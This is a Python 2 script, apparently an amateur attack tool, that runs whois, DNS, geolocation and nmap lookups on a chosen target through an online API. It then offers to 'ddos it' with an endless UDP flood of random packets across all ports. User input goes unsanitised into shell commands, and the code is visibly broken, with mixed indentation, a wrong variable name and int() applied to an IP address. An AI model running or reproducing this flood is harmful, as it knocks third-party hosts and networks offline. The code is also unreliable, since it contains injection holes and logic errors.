import sys
import os
import time
import socket
import random
d3=os.system("curl http://ipinfo.io/ip")
os.system("clear && clear && clear")
os.system("figlet NacreousDawn596")
logo = '''
       }--{+} Coded By NacreousDawn596 {+}--{                           
     '''
print logo
def quit():
            con = raw_input('Continue [Y/n] -> ')
            if con[0].upper() == 'N':
                exit()
            else:
                os.system("clear")
                os.system("figlet NacreousDawn596")
                print logo
                select()
           
def  select():
  try:
        d3 = raw_input('Enter IP Or Domain : ')
        os.system("clear")
        os.system("figlet whois")
        os.system("curl http://api.hackertarget.com/whois/?q=" + d3)
        print("")
        os.system
        os.system("curl https://api.hackertarget.com/mtr/?q=" + d3 )
        print("")
        os.system("figlet dns lookup")
        os.system("curl http://api.hackertarget.com/dnslookup/?q=" + d3 )
        print("")
	os.system("figlet reverse dns")
	os.system("curl https://api.hackertarget.com/reversedns/?q=" + d3 )
	print("")
	os.system("figlet geoip")
	os.system("curl http://api.hackertarget.com/geoip/?q=" + d3 )
	print("")
        os.system("nmap scan")
        os.system("curl http://api.hackertarget.com/nmap/?q=" + d3 )
        print("")
	os.system("ip lookup")
	os.system("wget http://api.hackertarget.com/reverseiplookup/?q=" + d3 )
        print("")
        os.system("figlet DDoS moment")
        conf = raw_input('do you want ddos it?  [Y/n] ->  ')
            if con[0].upper() == 'N':
                exit()
            else:
                os.system("clear")
                os.system("figlet NacreousDawn596")
                print logo
                #Code Time
                from datetime import datetime
                now = datetime.now()
                hour = now.hour
                minute = now.minute
                day = now.day
                month = now.month
                year = now.year

                ##############
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                bytes = random._urandom(1490)
                #############

                os.system("clear")
                os.system("figlet DDos Attack")
                print
                print "Author   : NacreousDawn596"
                print "Github   : https://github.com/NacreousDawn/DDoS-Attack"
                print
                ip = int(d3)
                port = 21
                os.system("figlet Attack Starting")
                print "[                    ] 0% "
                time.sleep(5)
                print "[=====               ] 25%"
                time.sleep(5)
                print "[==========          ] 50%"
                time.sleep(5)
                print "[===============     ] 75%"
                time.sleep(5)
                print "[====================] 100%"
                time.sleep(3)
                sent = 0
                while True:
                     sock.sendto(bytes, (ip,port))
                     sent = sent + 1
                     port = port + 1
                     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
                     if port == 65534:
                       port = 1
  except(KeyboardInterrupt):
    print ""
select()
